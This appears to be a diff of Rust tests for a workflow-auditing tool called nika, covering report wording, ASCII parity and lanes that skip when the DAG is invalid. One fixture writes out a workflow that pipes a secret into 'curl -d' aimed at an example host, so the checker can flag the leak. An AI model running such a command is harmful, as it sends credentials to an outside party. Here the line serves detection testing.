@@ -570,7 +570,7 @@ mod tests {
         let mut out = String::new();
         permits(&mut out, &report, &wf, theme);
         assert!(
-            out.contains("body fits the declared boundary"),
+            out.contains("literal + const: args fit the boundary"),
             "green panel: {out}"
         );
         assert!(
@@ -892,14 +892,21 @@ mod tests {
     /// task in that total is priced at its own token cap, so a run bills
     /// under it routinely (measured: $0.000242 against `≥$0.0305`). It
     /// also contradicted the COST section three lines above, which says
-    /// `≤N tk` per task and labels its range "worst-case ceiling".
+    /// `≤N tk` per task and labels its range "worst-case output ceiling".
+    ///
+    /// `est out ≤` is the second narrowing (2026-07-29). The COST section
+    /// says "worst-case OUTPUT ceiling · prompts, exec + mcp unpriced";
+    /// the card said `est ≤$X` flat, which reads as the bill. F7 measured
+    /// 328x on the commonest first workflow (fetch a 3.2 MB document,
+    /// summarise it: $2.4563 of input priced at $0.0075), so `out` is the
+    /// word that keeps the quoted line from meaning the whole meter.
     #[test]
     fn clean_verdict_is_the_audited_card_line() {
         let yaml = "nika: v1\nworkflow:\n  id: card\nmodel: mock/echo\npermits: { exec: [\"echo\"] }\ntasks:\n  a:\n    exec: { command: [\"echo\", \"hi\"] }\n  b:\n    after:\n      a: success\n    exec: { command: [\"echo\", \"bye\"] }\n";
         let text = checked_text("audited-card.nika.yaml", yaml, false);
         assert!(
             text.contains(
-                "✔ audited · 2 tasks · 2 waves · permits declared · est ≤$0.0000 · 0 hints"
+                "✔ audited · 2 tasks · 2 waves · permits declared · est out ≤$0.0000 · 0 hints"
             ),
             "the audited card line: {text}"
         );
@@ -909,7 +916,7 @@ mod tests {
         );
         let ascii = checked_text("audited-card-ascii.nika.yaml", yaml, true);
         assert!(
-            ascii.contains("ok audited") && ascii.contains("est <=$0.0000"),
+            ascii.contains("ok audited") && ascii.contains("est out <=$0.0000"),
             "ascii parity (ok · <=): {ascii}"
         );
         assert!(
@@ -921,6 +928,37 @@ mod tests {
             text.contains("0 hints") && !text.contains("0 hint·"),
             "{text}"
         );
+    }
+
+    /// The report must not teach a form the engine refuses.
+    ///
+    /// A painted literal is an ARGUMENT to `writeln!`, not part of its
+    /// format string, so `{{}}` inside one is not unescaped — it reaches
+    /// the terminal doubled. The zero-authority PERMITS line shipped that
+    /// way, and `permits: {{}}` is refused by YAML itself (a mapping used
+    /// as a key), so one line taught an unparseable form while the HINT
+    /// one row below printed the right one: two lines of the same output
+    /// disagreeing.
+    ///
+    /// The kit already carries this law for what IT teaches
+    /// (`the_kit_never_teaches_a_form_the_engine_refuses` in
+    /// `nika-onboard`). The engine's own diagnostics were outside it.
+    /// This closes that half, and closes the CLASS rather than the
+    /// instance: no doubled brace anywhere in a rendered report.
+    #[test]
+    fn the_report_never_teaches_a_doubled_brace() {
+        let pure = "nika: v1\nworkflow:\n  id: pure\ntasks:\n  j:\n    invoke:\n      tool: \"nika:jq\"\n      args:\n        expr: \".n\"\n        input: { n: 1 }\n";
+        for ascii in [false, true] {
+            let text = checked_text("doubled-brace.nika.yaml", pure, ascii);
+            assert!(
+                text.contains("`permits: {}` states it"),
+                "the zero-authority line names the form YAML accepts (ascii={ascii}): {text}"
+            );
+            assert!(
+                !text.contains("{{") && !text.contains("}}"),
+                "no doubled brace reaches the terminal (ascii={ascii}): {text}"
+            );
+        }
     }
 
     /// When conformance FAILS there is no valid DAG, so PLAN announces the skip
@@ -954,6 +992,71 @@ mod tests {
         assert!(
             text.contains("(skipped — no valid DAG order while conformance fails)"),
             "{text}"
+        );
+    }
+
+    /// PLAN was not the only DAG-gated lane — it was the only one that
+    /// SAID so. SECRETS and GATES read the topological waves; POLICY and
+    /// TRIFECTA are wrapped in an explicit `if conformance.is_empty()`
+    /// in `nika-check`. All four rendered `✔` on a workflow whose order
+    /// could not be computed, which is the false-green class at its
+    /// purest: the green did not mean the lane found nothing, it meant
+    /// nobody looked.
+    ///
+    /// The fixture is the measurement (2026-07-29). A secret piped
+    /// straight into `exec curl` is a real `SECRETS` finding; adding ONE
+    /// task that depends on a name which does not exist turned that
+    /// finding into `✔ SECRETS no information-flow escapes`. Both halves
+    /// are asserted here so a regression cannot pass by making the lane
+    /// silent in both directions.
+    #[test]
+    fn dag_gated_lanes_announce_the_skip_instead_of_a_verdict() {
+        const LEAK: &str = "nika: v1\nworkflow:\n  id: leak\nsecrets:\n  key: { source: env, key: K }\npermits: { exec: [\"curl\"], net: { http: [\"x.example.com\"] }, fs: { read: [\"data/**\"] } }\npolicy:\n  forbid: []\ntasks:\n  send:\n    with: { k: \"${{ secrets.key }}\" }\n    exec: { command: [\"curl\", \"-d\", \"${{ with.k }}\", \"https://x.example.com\"] }\n";
+        let analyzable = checked_text("lanes-analyzable.nika.yaml", LEAK, false);
+        assert!(
+            analyzable.contains("leak into exec (task `send`)"),
+            "the lane really does find this leak when the DAG resolves: {analyzable}"
+        );
+
+        // The SAME body plus one task depending on a name that does not exist.
+        let broken = format!(
+            "{LEAK}  ghost:\n    with: {{ z: \"${{{{ tasks.nope.output }}}}\" }}\n    exec: {{ command: [\"curl\", \"${{{{ with.z }}}}\"] }}\n"
+        );
+        let text = checked_text("lanes-skip.nika.yaml", &broken, false);
+        for lane in ["SECRETS", "GATES", "POLICY", "TRIFECTA"] {
+            // The placeholder makes ONE assert cover both failure shapes:
+            // the lane vanished, or it printed a verdict it never computed.
+            let line = text
+                .lines()
+                .find(|l| l.contains(lane))
+                .unwrap_or("<lane absent from the report>");
+            assert!(
+                line.contains("(skipped — no valid DAG order while conformance fails)"),
+                "{lane} must announce the skip, never a verdict it did not \
+                 compute — got `{line}` in: {text}"
+            );
+            assert!(
+                !line.contains('✔'),
+                "{lane} must not carry a verdict glyph while skipped: {line}"
+            );
+        }
+    }
+
+    /// The FAILING verdict had no ASCII twin. Every section row goes
+    /// through `mark()`, which swaps `✖` for `X ` under `--ascii`; the
+    /// last line of a red report carried a hardcoded `✖`, so the one row
+    /// a terminal without unicode most needs to read was the one row it
+    /// could not. The clean card was already covered
+    /// (`clean_verdict_is_the_audited_card_line`); this is its red twin.
+    #[test]
+    fn the_failing_verdict_has_an_ascii_twin() {
+        const BAD: &str = "nika: v1\nworkflow:\n  id: typo\ntasks:\n  t:\n    invoke: { tool: \"nika:raed\", args: { path: \"x\" } }\n";
+        let uni = checked_text("verdict-unicode.nika.yaml", BAD, false);
+        assert!(uni.contains("✖ findings above"), "{uni}");
+        let ascii = checked_text("verdict-ascii.nika.yaml", BAD, true);
+        assert!(
+            ascii.contains("findings above") && !ascii.contains('✖'),
+            "the failing verdict speaks ascii too: {ascii}"
         );
     }
 
